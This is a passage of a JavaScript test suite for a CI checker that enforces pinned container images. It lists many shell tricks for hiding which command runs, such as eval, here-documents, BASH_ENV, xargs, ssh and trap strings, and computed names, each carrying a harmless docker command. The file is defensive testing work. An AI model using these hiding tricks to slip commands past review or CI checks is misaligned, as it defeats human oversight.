// while bash ran the docker command: it is read (the image is found) or refused.
const GENERATED = {
  'expanding here-document into bash, substitution output as the script': `bash <<EOF\n$(printf '%s\\n' 'docker run alpine:latest')\nEOF`,
  'expanding here-document into bash, a variable as the script': `payload='docker run alpine:latest'\nbash <<EOF\n$payload\nEOF`,
  'a command substitution as the executable': `$(printf '%s%s run alpine:latest' dock er)`,
  'a variable as the executable': `c=docker\n$c run alpine:latest`,
  'a quoted variable as the executable behind env': `c=docker\nenv "$c" run alpine:latest`,
  'source of a here-document through /dev/stdin': `source /dev/stdin <<'EOF'\ndocker run alpine:latest\nEOF`,
  'dot of a here-document through /dev/stdin': `. /dev/stdin <<'EOF'\ndocker run alpine:latest\nEOF`,
  'source of a file that is not a CI shell file': `source tools/other.sh`,
  'xargs rewrites the shell text': `printf '%s\\n' 'docker run alpine:latest' | xargs -I{} bash -c '{}'`,
  'find -exec rewrites the shell text': `find . -maxdepth 0 -exec sh -c '{}' \\;`,
  'flock command string': `flock /tmp/l -c 'docker run alpine:latest'`,
  'su command string': `su -c 'docker run alpine:latest' nobody`,
  'script command string': `script -qc 'docker run alpine:latest' /dev/null`,
  'ssh command string': `ssh host 'docker run alpine:latest'`,
  'watch command string': `watch -n1 'docker run alpine:latest'`,
  'flock behind env options': `env -u FOO flock /tmp/l -c 'docker run alpine:latest'`,
  'ssh behind timeout operands': `timeout 5 ssh host 'docker run alpine:latest'`,
  'sudo -s command string': `sudo -s 'docker run alpine:latest'`,
  'a computed command string for su': `cmd='docker run alpine:latest'\nsu -c "$cmd" nobody`,
  'commands piped into ssh': `printf '%s\\n' 'docker run alpine:latest' | ssh host`,
  'env -S splits a string into a command': `env -S 'docker run alpine:latest'`,
  alias: `alias d='docker run alpine:latest'\nd`,
  'trap handler': `trap 'docker run alpine:latest' EXIT`,
  'trap handler behind a computed text': `h='docker run alpine:latest'\ntrap "$h" EXIT`,
  'BASH_ENV assigned in the script': `BASH_ENV=./other.sh bash -c true`,
  'BASH_ENV exported': `export BASH_ENV=./other.sh\nbash -c true`,
  'BASH_ENV behind env': `env BASH_ENV=./other.sh bash -c true`,
};
test('PR #805 r2 F1: generated and rewritten shell text is read or refused, never dropped', () => {
  for (const [shape, script] of Object.entries(GENERATED))
    for (const kind of ['shell', 'workflow']) {
      const { errors, found } = outcome(kind, script);
      assert.ok(errors.length > 0 || found, `${shape} (${kind}): nothing read, nothing refused`);
    }
});
test('PR #805 r2 F1: a workflow env that a shell evaluates at startup refuses', () => {
  for (const level of ['workflow', 'job', 'step']) {
    const step = { run: 'true', ...(level === 'step' && { env: { BASH_ENV: './x.sh' } }) };
    const doc = {
      ...(level === 'workflow' && { env: { BASH_ENV: './x.sh' } }),
      jobs: { j: { ...(level === 'job' && { env: { BASH_ENV: './x.sh' } }), steps: [step] } },
    };
    const { errors } = validateInfraImagePins(
      [{ kind: 'workflow', name: '.github/workflows/x.yml', text: stringify(doc) }],
      bare,
    );
    assert.ok(
      errors.some((error) => /env sets BASH_ENV/.test(error)),
      level,
    );
  }
});
test('PR #805 r2 F1: text a program runs is read where this check models it, refused elsewhere', () => {
  // FU-159 r2: a string runner is no longer "modeled by its strings": it is a program in no table
  for (const script of [
    `su -c 'docker run alpine:latest' nobody`,
    `script -qc 'docker run alpine:latest' /dev/null`,
    `ssh host 'docker run alpine:latest'`,
    `watch -n1 'docker run alpine:latest'`,
    `flock /tmp/l -c 'docker run alpine:latest'`,
  ])
    assert.ok(
      outcome('shell', script).errors.some((e) =>
        /does not model|not one this check reads/.test(e),
      ),
      script,
    );
  // a trap handler is read as the script it is
  assert.ok(outcome('shell', `trap 'docker run alpine:latest' EXIT`).found);
});
test('PR #805 r2 F1: the harmless controls stay readable', () => {
  for (const body of [
    "trap 'echo bye' EXIT",
    'trap - EXIT\ntrap -l',
    'bash <<EOF\necho hi\nEOF',
    "bash <<'EOF'\necho $HOME\nEOF",
    'cat <<EOF\n$HOME\nEOF',
    'x=$(date)\necho "$x"',
    'timeout 5 sleep 1',
    'env FOO=1 true',
    'BASH_ENV_NOT=1 true',
  ])
    assert.deepEqual(outcome('shell', body).errors, [], body);
});

// PR #805 r2 F2: the eval exemption proves where the evaluated variable came from. Every row
// is a producer that did not reach the evaluating shell, or a write the first-word reader of
// ea79eb47 did not see; each was approved there and printed the docker marker under bash.
test('PR #805 r2 F2: eval provenance survives prefixes, declarations and list boundaries', () => {
  const creds = { ...bare, evaluatedOutputs: new Map([['infra/creds.sh', 'prints exports only']]) };
  const producer = 'c="$(bash infra/creds.sh)"';
  const evaluate = (body) => validateInfraImagePins([credsFile, asInput('shell', body)], creds);
  assert.deepEqual(evaluate(`${producer}\neval "\${c}"`).errors, []);
  for (const body of [
    `${producer}\nbuiltin printf -v "$(printf '\\143')" '%s' 'docker run alpine:latest'\neval "\${c}"`,
    `${producer}\ncommand printf -v "$(printf '\\143')" '%s' 'docker run alpine:latest'\neval "\${c}"`,
    `${producer}\nbuiltin read -r "$name"\neval "\${c}"`,
    `${producer}\ncommand read -r "$name"\neval "\${c}"`,
    `${producer}\nbuiltin declare -n ref=c\nref=x\neval "\${c}"`,
    `${producer}\ncommand -p printf -v "$n" x\neval "\${c}"`,
    `function f { ${producer}; }\neval "\${c}"`,
    `function f {\n  ${producer}\n}\neval "\${c}"`,
    `coproc { ${producer}; }\neval "\${c}"`,
    `coproc NAMED { ${producer}; }\neval "\${c}"`,
    `time if false; then\n  ${producer}\nfi\neval "\${c}"`,
    `! if false; then\n  ${producer}\nfi\neval "\${c}"`,
    `time while false; do\n  ${producer}\ndone\neval "\${c}"`,
    `time case x in y)\n  ${producer}\n  ;;\nesac\neval "\${c}"`,
    `! { ${producer}; }\neval "\${c}"`,
    `${producer} || true &\neval "\${c}"`,
    `${producer} || true &\n( eval "\${c}" )`,
    `${producer} || exit 1 &\neval "\${c}"`,
  ])
    assert.ok(
      evaluate(body).errors.some((error) => /^scripts\/x\.sh:\d+: eval runs text/.test(error)),
      body,
    );
  // a list that ends before the background marker is still the producer's own
  assert.deepEqual(evaluate(`${producer} || true\neval "\${c}"`).errors, []);
  // the real CI shape: top-level producer, evaluated in a backgrounded subshell
  assert.deepEqual(evaluate(`${producer}\n( eval "\${c}" && true & )`).errors, []);
});

// FU-150 F1: the program that runs is found through ONE execution boundary: control words,
// wrappers with option arity, xargs and find -exec. Each of these 84 calls returned no image and no
// error on 75bf3243 while bash ran `docker <verb> alpine:latest`.
const BEHIND = {
  if: (r) => `c=docker\nif $c ${r}; then :; fi`,
  then: (r) => `c=docker\nif true; then $c ${r}; fi`,
  else: (r) => `c=docker\nif false; then :; else $c ${r}; fi`,
  elif: (r) => `c=docker\nif false; then :; elif $c ${r}; then :; fi`,
  do: (r) => `c=docker\nfor i in 1; do $c ${r}; done`,
  while: (r) => `c=docker\nwhile $c ${r}; do break; done`,
  brace: (r) => `c=docker\n{ $c ${r}; }`,
  '/usr/bin/env': (r) => `c=docker\n/usr/bin/env $c ${r}`,
  'env -u X': (r) => `c=docker\nenv -u FOO $c ${r}`,
  'timeout -s SIG N': (r) => `c=docker\ntimeout -s TERM 5 $c ${r}`,
  'sudo -u U': (r) => `c=docker\nsudo -u root $c ${r}`,
  'stdbuf -o L': (r) => `c=docker\nstdbuf -o L $c ${r}`,
};
test('FU-150 F1: a computed program behind a control word or a wrapper refuses', () => {
  for (const [shape, script] of Object.entries(BEHIND))
    for (const verb of ['run', 'create', 'pull'])
      for (const kind of ['shell', 'workflow']) {
        const { errors, found } = outcome(kind, script(`${verb} alpine:latest`));
        assert.ok(
          errors.some((error) => /runs the command word \$c/.test(error)) || found,
          `${shape} ${verb} ${kind}: ${JSON.stringify(errors)}`,
        );
      }
});
test('FU-150 F1: nested wrappers, other control words and unknown wrapper options refuse', () => {
  for (const script of [
    'env -u X timeout -s TERM 5 nice -n 5 $c run alpine:latest',
    'flock /tmp/l $c run alpine:latest',
    'coproc $c run alpine:latest',
    'coproc NAMED { $c run alpine:latest; }',
    'function f { $c run alpine:latest; }',
    'case x in y) $c run alpine:latest;; esac',
    'time -p $c run alpine:latest',
    'if ! $c run alpine:latest; then :; fi',
    'nohup $c run alpine:latest',
    'xargs xargs $c run alpine:latest',
    'find . -exec env $c run alpine:latest \\;',
    'find . -execdir $c run alpine:latest +',
    'exec -a name $c run alpine:latest',
    'ionice -c 3 $c run alpine:latest',
    'sudo -uroot "${c}" run alpine:latest',
    // an option the wrapper table does not list is not read past
    'timeout --bogus 5 docker version',
    'sudo -Z true',
    'sudo --user root $c run alpine:latest',
    'sudo --user=root $c run alpine:latest',
    'timeout --signal TERM 5 $c run alpine:latest',
    'xargs --bogus true',
    // a redirection in front of the command word is not the command word
    '>/dev/null $c run alpine:latest',
    '2>&1 $c run alpine:latest',
    '>&2 $c run alpine:latest',
    'env -u X >/dev/null $c run alpine:latest',
    'exec >/dev/null $c run alpine:latest',
    'timeout 5 2>/dev/null $c run alpine:latest',
    '< /dev/null $c run alpine:latest',
    'timeout >/dev/null 5 $c run alpine:latest',
    'flock 2>/dev/null /tmp/l $c run alpine:latest',
    // a program the shell expands from a pattern
    '{docker,run} alpine:latest',
    'docker* run alpine:latest',
    '/usr/bin/doc?er run alpine:latest',
    'env - $c run alpine:latest',
    // a one-word command in a case body that is computed is not a pattern
    'case x in a)\n  $c\n  ;;\nesac',
    // sourcing and trapping behind a control word or a wrapper
    'if true; then source tools/other.sh; fi',
    'env -u X . tools/other.sh',
    'while true; do trap "$h" EXIT; done',
  ])
    assert.ok(outcome('shell', script).errors.length > 0, script);
});
test('FU-150 F1: wrappers and control words that run a literal program stay readable', () => {
  for (const body of [
    'env -u FOO true',
    'env A=1 B=2 true',
    '/usr/bin/env true',
    'timeout -s TERM 5 sleep 1',
    'timeout -k5 10 sleep 1',
    'sudo -u root true',
    'sudo -uroot -n true',
    'stdbuf -o L cat',
    'nice -n 5 sleep 1',
    'nice -5 sleep 1',
    'if true; then echo hi; elif false; then echo no; else echo x; fi',
    'for i in 1 2; do echo "$i"; done',
    'while read -r line; do echo "$line"; done <<< x',
    'command -v "$tool" >/dev/null',
    'f() { echo hi; }; f',
    'case "$x" in a) echo a;; b|c) echo b;; esac',
    'time -p true',
    '>/dev/null true',
    '2>&1 true',
    '>&2 echo hi',
    'exec >/dev/null',
    'exec 3>&1',
    'timeout 5 >/dev/null true',
    'true 2>&1 | cat',
    '[[ "$a" > "$b" ]] && true',
    '[ -n x ] && [[ -n y ]] && true',
    'case "$x" in\n  *-service | other) echo a ;;\n  #*) echo b ;;\n  *) echo c ;;\nesac',
    'case "$x" in a | b) true ;; esac',
    // an assignment's value is not a command, whatever its last path component is called
    'X=dir/alias true',
    'export Y=dir/trap',
    'sudo --user root true',
  ])
    assert.deepEqual(outcome('shell', body).errors, [], body);
  // a literal docker behind the same wrappers is still read as a docker command
  for (const body of [
    'env -u FOO docker run alpine:latest',
    'timeout -s TERM 5 docker run alpine:latest',
    'if true; then sudo -u root docker run alpine:latest; fi',
  ])
    assert.ok(outcome('shell', body).found, body);
});

// FU-150 F1: `source` runs the file the EXACT path names, and only a CI .sh file this run read
// or a .bash library whose sha256 a reviewer pinned. 75bf3243 matched by suffix.
const libText = 'role_password() { :; }\n';
const sha = (text) => createHash('sha256').update(text).digest('hex');
const LIB = 'infrastructure/docker/postgres/lib/role-passwords.bash';
const withLibrary = {
  ...bare,
  sourcedLibraries: new Map([[LIB, { sha256: sha(libText), reason: 'x' }]]),
};
const library = (text = libText, name = LIB) => ({ kind: 'library', name, text });
const sourcing = (word, name = 'infrastructure/docker/postgres/init.sh') => ({
  kind: 'shell',
  name,
  text: `source ${word}\n`,
});
const sourceErrors = (script, libs = [library()]) =>
  validateInfraImagePins([...libs, script], withLibrary).errors;
test('FU-150 F1: source resolves the exact path of a verified library', () => {
  assert.deepEqual(
    sourceErrors(sourcing(`"$(dirname "\${BASH_SOURCE[0]}")/lib/role-passwords.bash"`)),
    [],
  );
  // `..` is normalised: the path that results is the exact one
  assert.deepEqual(
    sourceErrors(
      sourcing(
        '"$(dirname "${BASH_SOURCE[0]}")/../postgres/lib/role-passwords.bash"',
        'infrastructure/docker/other/init.sh',
      ),
    ),
    [],
  );
  assert.deepEqual(sourceErrors(sourcing(LIB, 'scripts/x.sh')), []);
  assert.deepEqual(sourceErrors(sourcing(`./${LIB}`, 'scripts/x.sh')), []);
  for (const [word, name] of [
    // the reviewer's probe: an arbitrary directory selects other contents
    ['"${UNTRUSTED}/lib/role-passwords.bash"', undefined],
    ['"${UNTRUSTED}/infrastructure/docker/postgres/lib/role-passwords.bash"', undefined],
    [`"$HOME/${LIB}"`, undefined],
    // a suffix of the listed path is not the path
    [`evil/${LIB}`, 'scripts/x.sh'],
    ['"$(dirname "${BASH_SOURCE[0]}")/lib/role-passwords.bash"', 'scripts/x.sh'],
    ['"$(dirname "${BASH_SOURCE[0]}")/../postgres/lib/role-passwords.bash"', 'scripts/x.sh'],
    // FU-159 F3: `$0` is the sourcing shell's name once another script sources this one
    ['"$(dirname "$0")/lib/role-passwords.bash"', undefined],
    ['"$(pwd)/lib/role-passwords.bash"', undefined],
    ['"$(dirname "$1")/lib/role-passwords.bash"', undefined],
    ['"$(cd x; dirname "$0")/lib/role-passwords.bash"', undefined],
    ['"$(dirname "$0")/lib/$name.bash"', undefined],
    ['"$(dirname "$0")/lib/*.bash"', undefined],
    [`${LIB.replace('role', 'other')}`, 'scripts/x.sh'],
    [`/${LIB}`, 'scripts/x.sh'],
  ])
    assert.ok(
      sourceErrors(sourcing(word, name)).some((error) => /source runs .*does not read/.test(error)),
      word,
    );
  // `$0` of a nested script is not the file's own
  const nested = {
    kind: 'shell',
    name: 'infrastructure/docker/postgres/init.sh',
    text: `bash <<'EOF'\nsource "$(dirname "$0")/lib/role-passwords.bash"\nEOF\n`,
  };
  assert.ok(sourceErrors(nested).some((error) => /source runs/.test(error)));
});
test('FU-150 F1: a library is read by contents: unlisted, changed or unread refuses', () => {
  const script = sourcing(LIB, 'scripts/x.sh');
  assert.ok(
    sourceErrors(script, [library('changed\n')]).some((e) =>
      /contents changed \(sha256 [0-9a-f]{64}\)/.test(e),
    ),
  );
  assert.ok(sourceErrors(script, [library('changed\n')]).some((e) => /source runs/.test(e)));
  assert.ok(sourceErrors(script, []).some((e) => /source runs/.test(e)));
  assert.ok(
    sourceErrors(script, [library(libText, 'infrastructure/new/lib.bash'), library()]).some((e) =>
      /infrastructure\/new\/lib\.bash: a \.bash file no reviewed list names/.test(e),
    ),
  );
  // text a hash of the decoded characters cannot tell apart refuses, even with the listed hash
  for (const text of ['x\uFFFD\n', 'x\r\n']) {
    const listed = {
      ...withLibrary,
      sourcedLibraries: new Map([[LIB, { sha256: sha(text), reason: 'x' }]]),
    };
    const { errors } = validateInfraImagePins([library(text), script], listed);
    assert.ok(
      errors.some((e) => /cannot be read/.test(e)),
      JSON.stringify(text),
    );
    assert.ok(
      errors.some((e) => /source runs/.test(e)),
      JSON.stringify(text),
    );
  }
  // once libraries are passed, a listed one the run did not find is stale
  const two = {
    ...withLibrary,
    sourcedLibraries: new Map([
      ...withLibrary.sourcedLibraries,
      ['scripts/gone.bash', { sha256: 'x', reason: 'x' }],
    ]),
  };
  assert.ok(
    validateInfraImagePins([library()], two).errors.some((e) =>
      /lists scripts\/gone\.bash, which was not found/.test(e),
    ),
  );
  // a library is never run as a script
  assert.ok(
    sourceErrors({ kind: 'shell', name: 'scripts/x.sh', text: `bash ${LIB}\n` }).some((e) =>
      /runs infrastructure.*does not read/.test(e),
    ),
  );
});
test('FU-150 F1: the CLI reads every .bash file of infrastructure/ and scripts/', () => {
  const cli = readFileSync(join(root, 'scripts', 'check-dockerfile-pins.mjs'), 'utf8');
  assert.match(cli, /\\\.\(\?:sh\|bash\)\$/);
  assert.match(cli, /'library'/);
  // and the committed libraries are exactly the listed ones, with the pinned contents
  // Git's file list (the inventory), never a walk: repo-relative, '/'-separated.
  const found = ['infrastructure', 'scripts']
    .flatMap((dir) => authoredFiles(join(root, dir)))
    .filter((f) => f.endsWith('.bash'))
    .map((f) => relative(root, f).split(sep).join('/'));
  assert.deepEqual([...SOURCED_LIBRARIES.keys()].sort(), found.sort());
});

// FU-150 F2: a write the checker cannot attribute to a name breaks the provenance of an evaluated
// variable wherever the writing command stands, not only as the first word of a line.
const creds150 = {
  ...bare,
  evaluatedOutputs: new Map([['infra/creds.sh', 'prints exports only']]),
};
test('FU-150 F2: writers after control words, in functions and with attached options refuse', () => {
  const producer = 'c="$(bash infra/creds.sh)"';
  const dynamic = `printf -v "$(printf '\\143')" '%s' 'docker run alpine:latest'`;
  const evaluate = (body) =>
    validateInfraImagePins([credsFile, asInput('shell', body)], creds150).errors;
  const refused = (body) =>
    assert.ok(
      evaluate(body).some((e) => /^scripts\/x\.sh:\d+: eval runs text/.test(e)),
      body,
    );
  for (const writer of [
    `if ${dynamic}; then :; fi`,
    `if true; then ${dynamic}; fi`,
    `if false; then :; else ${dynamic}; fi`,
    `if false; then :; elif ${dynamic}; then :; fi`,
    `for i in 1; do ${dynamic}; done`,
    `while ${dynamic}; do break; done`,
    `until ${dynamic}; do break; done`,
    `{ ${dynamic}; }`,
    `f() { ${dynamic}; }; f`,
    `function f { ${dynamic}; }; f`,
    `if true; then builtin ${dynamic}; fi`,
    `if true; then time -p ${dynamic}; fi`,
    "printf -vc '%s' x",
    "if true; then printf -vc '%s' x; fi",
    'read -ac <<<x',
    'if true; then read -r "$name"; fi',
    'if true; then declare -n ref=c; fi',
    'if true; then source ./other.sh; fi',
    // a computed target inside arithmetic (the name is built, never written as text)
    `n="$(printf '\\143')"\n(( \${n}=5 ))`,
    `n="$(printf '\\143')"\nx=$(( \${n}=5 ))`,
    `n="$(printf '\\143')"\nif (( \${n}=5 )); then :; fi`,
    // a declaration whose name is computed
    'export "$n=docker run alpine:latest"',
    'if true; then export "$(printf c)=x"; fi',
    // an exempt line is not read for its command word, but it may still write
    `timeout --bogus 5 printf -v "$(printf '\\143')" x # image-pin-exempt: reason\ntrue\ntrue`,
  ])
    refused(`${producer}\n${writer}\neval "\${c}"`);
  // the unrelated writers of the same shape do not break the real producer/eval shape
  for (const body of [
    `${producer}\nif true; then printf -v other '%s' x; fi\neval "\${c}"`,
    `${producer}\nfor i in 1; do echo "$i"; done\neval "\${c}"`,
    `${producer}\n{ echo hi; }\neval "\${c}"`,
    `${producer}\n( eval "\${c}" && true & )`,
    `${producer}\nn="$(printf '\\143')"\n(( n=5 ))\neval "\${c}"`,
  ])
    assert.deepEqual(evaluate(body), [], body);
});

// =============================================================================
// FU-159: the execution boundary fails CLOSED. Every probe of the PR #832 round-1 review is a row
// here; each was approved (no error, no image) on 711852a3.
// =============================================================================
const R = 'run alpine:latest';
const refusedBoth = (script, policy = bare, extra = []) => {
  for (const kind of ['shell', 'workflow']) {
    const { errors, images } = validateInfraImagePins([...extra, asInput(kind, script)], policy);
    assert.ok(
      errors.length > 0 || images.some(({ ref }) => ref === 'alpine:latest'),
      `${kind}: ${script}`,
    );
  }
};
test('FU-159 F1: case patterns are parsed apart from case bodies', () => {
  refusedBoth('case x in x) {docker,run,alpine:latest};; esac');
  refusedBoth(`c=docker\ncase x in\n  a | b) $c ${R};;\nesac`);
  refusedBoth('case x in (x) {docker,run,alpine:latest};; esac');
  // the patterns themselves, however they look, are not commands
  for (const body of [
    'case "$x" in\n  *-service | other) true ;;\n  #*) true ;;\n  [a-z]*) true ;;\n  {a,b}) true ;;\n  $y) true ;;\nesac',
    'case x in x) case y in y) true;; esac;; z) true;; esac',
  ])
    assert.deepEqual(outcome('shell', body).errors, [], body);
  // a quoted `case` is a command, not the keyword: nothing after it is a pattern
  refusedBoth(`"case" x in\n docker ${R}\n)`);
  assert.deepEqual(
    tokenizeShell('"case" x in y').commands.map((c) => Boolean(c.pattern)),
    [false],
  );
  assert.ok(outcome('shell', 'case x in x) true').errors.length > 0, 'a case with no esac');
  assert.deepEqual(
    tokenizeShell('case x in a|b) echo hi;; esac').commands.map((c) => Boolean(c.pattern)),
    [false, true, false, false],
  );
});
test('FU-159 F1: only a genuine NAME= token is an assignment', () => {
  for (const body of [
    "c='docker run alpine:latest echo'\n$c=x",
    "c='docker run alpine:latest echo'\n${c}=x",
    `c=docker\nenv $c=x ${R}`,
  ])
    refusedBoth(body);
  for (const body of ['a=1', 'a+=1 true', 'a[1]=1', 'export a=1 b=2', 'env A=1 true'])
    assert.deepEqual(outcome('shell', body).errors, [], body);
});
test('FU-159 F1: after `--` the wrapper still takes its positional operands', () => {
  for (const wrapper of ['timeout -- 5', 'chroot -- /', 'flock -- /tmp/l', 'timeout -s TERM -- 5'])
    refusedBoth(`c=docker\n${wrapper} $c ${R}`);
  for (const body of ['timeout -- 5 sleep 1', 'chroot -- / true', 'env -- A=1 true'])
    assert.deepEqual(
      outcome('shell', body).errors.filter((e) => !/chroot/.test(e)),
      [],
      body,
    );
});
test('FU-159 F1: xargs input and unquoted operands cannot choose the program', () => {
  for (const wrapper of ['env', 'nice', 'timeout 5', 'stdbuf -o L']) {
    refusedBoth(`printf 'docker ${R}\\n' | xargs ${wrapper}`);
    for (const replace of ['-I {}', '-i', '--replace', '-I X', '-IX', '--replace=X'])
      refusedBoth(
        `printf 'doc%s' ker | xargs ${replace} ${wrapper} ${replace.endsWith('X') ? 'X' : '{}'} ${R}`,
      );
  }
  refusedBoth("printf 'doc%s' ker | xargs -I CMD env CMD run alpine:latest");
  // the replace string may be the name of a harmless program: it is still replaced
  refusedBoth(`printf 'doc%s' ker | xargs -I echo env echo ${R}`);
  refusedBoth("printf 'doc%s' ker | xargs taskset 1");
  refusedBoth("printf 'doc%s' ker | xargs frob");
  for (const wrapper of ['env -u $x', 'sudo -u $x', 'nice -n $x', 'timeout $x', 'timeout -s $x 5'])
    refusedBoth(`x='A docker'\n${wrapper} echo ${R}`);
  for (const body of ['env -u "$x" true', 'timeout "$t" true'])
    assert.deepEqual(outcome('shell', body).errors, [], body);
});
test('FU-159 F1: an executable this run did not read refuses', () => {
  const read = { kind: 'shell', name: 'tools/ok.sh', text: 'true' };
  for (const body of [
    './tools/evil.sh',
    './tools/evil.bash',
    '"${UNTRUSTED}/evil.sh"',
    'taskset 1 ./tools/evil.sh',
    'echo x | xargs ./tools/evil.sh',
    'find . -exec ./tools/evil.sh {} \\;',
    './env true',
    'env ./tools/evil.sh',
    '/home/x/evil.sh',
  ])
    refusedBoth(body, bare, [read]);
  assert.deepEqual(
    validateInfraImagePins([read, asInput('shell', './tools/ok.sh')], bare).errors,
    [],
  );
  assert.deepEqual(
    validateInfraImagePins([read, asInput('shell', 'env -u X ./tools/ok.sh')], bare).errors,
    [],
  );
  // a computed path is not the file, however it ends or normalises
  for (const body of ['"${ROOT}/tools/ok.sh"', '"$x/../tools/ok.sh"', '${x}/../tools/ok.sh'])
    refusedBoth(body, bare, [read]);
  // EXECUTED_PROGRAMS: exact script and word; a word nothing runs is stale
  const policy = {
    ...bare,
    executedPrograms: new Map([
      ['scripts/x.sh', { words: ['${TOOLS_BIN}/tools/ok.sh'], reason: 'TOOLS_BIN is the root' }],
    ]),
  };
  assert.deepEqual(
    validateInfraImagePins(
      [read, asInput('shell', 'readonly TOOLS_BIN=/r\n"${TOOLS_BIN}/tools/ok.sh"')],
      policy,
    ).errors,
    [],
  );
  assert.ok(
    validateInfraImagePins([read, asInput('shell', 'true')], policy).errors.some((e) =>
      /nothing runs any more/.test(e),
    ),
  );
  assert.ok(
    validateInfraImagePins(
      [read, { ...asInput('shell', '"${TOOLS_BIN}/tools/ok.sh"'), name: 'scripts/y.sh' }],
      policy,
    ).errors.some((e) => /does not read/.test(e)),
  );
});

const P159 = (name) => `${name}="$(bash infra/creds.sh)"`;
const creds159 = (body) =>
  validateInfraImagePins([credsFile, asInput('shell', body)], creds150).errors;
const evalRefused = (body) =>
  assert.ok(
    creds159(body).some((e) => /^scripts\/x\.sh:\d+: eval runs text/.test(e)),
    body,
  );
test('FU-159 F2: writes are read from canonical words, however the name is spelled', () => {
  const spell = {
    plain: (n) => n,
    'quote inside': (n) => `${n.slice(0, 4)}""${n.slice(4)}`,
    escape: (n) => `${n.slice(0, 4)}\\${n.slice(4)}`,
    quoted: (n) => `"${n}"`,
    single: (n) => `'${n}'`,
    continued: (n) => `${n.slice(0, 4)}\\\n${n.slice(4)}`,
  };
  const text = "'docker run alpine:latest'";
  const writers = {
    'printf -v': (n) => `printf -v ${n} '%s' ${text}`,
    'printf -vNAME': (n) => `printf -v${n} '%s' ${text}`,
    read: (n) => `read ${n} <<<${text}`,
    'IFS= read -a': (n) => `IFS= read -a ${n} <<<${text}`,
    mapfile: (n) => `mapfile ${n} <<<${text}`,
    readarray: (n) => `readarray ${n} <<<${text}`,
    typeset: (n) => `typeset ${n}=${text}`,
    'declare --': (n) => `declare -- ${n}=${text}`,
    'export --': (n) => `export -- ${n}=${text}`,
    'readonly --': (n) => `readonly -- ${n}=${text}`,
  };
  for (const write of Object.values(writers))
    for (const name of Object.values(spell))
      evalRefused(`${P159('commands')}\n${write(name('commands'))}\neval "$commands"`);
});
test('FU-159 F2: implicit targets, loop variables, eval/trap text and arithmetic invalidate provenance', () => {
  for (const [name, writer] of [
    ['REPLY', 'read <<<x'],
    ['REPLY', 'select i in a; do break; done <<<1'],
    ['MAPFILE', 'mapfile <<<x'],
    ['MAPFILE', 'readarray <<<x'],
    ['OPTARG', 'getopts a: o -a docker'],
    ['OPTIND', 'getopts a: o -a docker'],
    ['commands', 'for comm\\\nands in x; do :; done'],
    ['commands', 'for "commands" in x; do :; done'],
    ['commands', `eval 'printf -v comm""ands %s x'`],
    ['commands', `eval 'commands=x'`],
    ['commands', `trap 'printf -v comm""ands %s x' EXIT`],
    ['commands', `trap 'commands=x' EXIT`],
    ['commands', "printf '%n' commands"],
    ['c', 'n="$(printf \'\\143\')"\nprintf \'%n\' "$n"'],
    ['commands', 'let "comm""ands=5"'],
    ['commands', 'unset comm""ands'],
    ['commands', 'echo $(( commands = 5 ))'],
    ['commands', '(( commands = 5 ))'],
    ['commands', ': ${commands:=x}'],
    // an eval or handler whose text is computed may write anything (exempted, so only the
    // trusted eval below can refuse)
    ['commands', 'q=x\neval "$q" # image-pin-exempt: r\ntrue'],
    ['commands', 'q=x\ntrap "$q" EXIT # image-pin-exempt: r\ntrue'],
    ['commands', 'q=x\neval "printf -v $q %s x" # image-pin-exempt: r\ntrue'],
    // the name is built from a substitution: no text of the script says which variable it is
    ['c', 'q="$(printf \'\\143\')"\ntrap "printf -v $q %s x" EXIT # image-pin-exempt: r\ntrue'],
    // a variable that is NOT an approved producer's output is not a trusted eval
    ['commands', 'd="$(bash infra/other.sh)"\neval "$d" # image-pin-exempt: r\ntrue'],
  ])
    evalRefused(`${P159(name)}\n${writer}\neval "$${name}"`);
  // harmless writers of other names, in every spelling, leave the producer trusted
  for (const body of [
    `${P159('commands')}\nprintf -v other '%s' x\nread line <<<x\neval "$commands"`,
    `${P159('commands')}\nprintf -v ot""her '%s' x\neval "$commands"`,
    `${P159('commands')}\nfor i in 1 2; do :; done\neval "$commands"`,
    `${P159('commands')}\ntrap 'echo bye' EXIT\neval "$commands"`,
    `${P159('commands')}\n( eval "\${commands}" && true & )`,
  ])
    assert.deepEqual(creds159(body), [], body);
});

// FU-159 F3: a relative file is the file only while the directory is the one the script started in.
test('FU-159 F3: a directory change refuses the approval of a source or a script that follows', () => {
  const lib = 'infrastructure/docker/postgres/lib/role-passwords.bash';
  const other = { kind: 'shell', name: 'scripts/other.sh', text: 'true' };
  const errors = (body) =>
    validateInfraImagePins(
      [
        library(),
        other,
        {
          kind: 'shell',
          name: 'infrastructure/docker/postgres/init.sh',
          text: body.replace('LIB', lib),
        },
      ],
      withLibrary,
    ).errors;
  for (const body of [
    'cd /tmp\nsource LIB',
    'pushd /tmp\n. LIB',
    'popd\nsource LIB',
    "eval 'cd /tmp'\nsource LIB",
    'f() { cd /tmp; }\nsource LIB\nf',
    'for i in 1 2; do source LIB; cd /tmp; done',
    "trap 'cd /tmp' EXIT\nsource LIB",
    "trap 'source LIB' EXIT\ncd /tmp",
    'cd /tmp\nx="$(bash scripts/other.sh)"',
    'cd /tmp\nx="$(source LIB)"',
    'cd /tmp\nbash scripts/other.sh',
    'cd /tmp\nscripts/other.sh',
    'env -C /tmp bash scripts/other.sh',
    'env --chdir=/tmp bash scripts/other.sh',
    'sudo -D /tmp bash scripts/other.sh',
    'sudo --chdir=/tmp scripts/other.sh',
    'chroot / bash scripts/other.sh',
    'env -C /tmp scripts/other.sh',
  ])
    assert.ok(
      errors(body).some((e) => /does not read/.test(e)),
      body,
    );
  for (const body of [
    'source LIB\ncd /tmp',
    '( cd /tmp )\nsource LIB',
    'x="$(cd /tmp && pwd)"\nsource LIB',
    'bash scripts/other.sh\ncd /tmp',
    'env -u X scripts/other.sh',
  ])
    assert.deepEqual(errors(body), [], body);
});

test('FU-159 F1: a function is a definition read from tokens; a string or comment that imitates one is not', () => {
  assert.deepEqual(
    [...tokenizeShell('f() { :; }\nfunction g { :; }\nh ( ) { :; }\nk=(a b)').functions].sort(),
    ['f', 'g', 'h'],
  );
  assert.deepEqual([...tokenizeShell(`echo ';taskset() {'\n# chrt() {\nx "$(y)"`).functions], []);
  assert.deepEqual([...tokenizeShell('taskset ( true )').functions], []);
  refusedBoth(`echo ';taskset() {'\n# taskset() {\nc=docker\ntaskset 1 $c ${R}`);
  // a function of the file, or of a file it sources, is its own program
  assert.deepEqual(outcome('shell', 'taskset() { "$@"; }\nc=true\ntaskset 1 $c').errors.length, 1);
  assert.deepEqual(outcome('shell', 'f() { echo "$1"; }\nf "$a"').errors, []);
});
test('FU-159 F2: coproc and `exec {fd}>` name variables they write', () => {
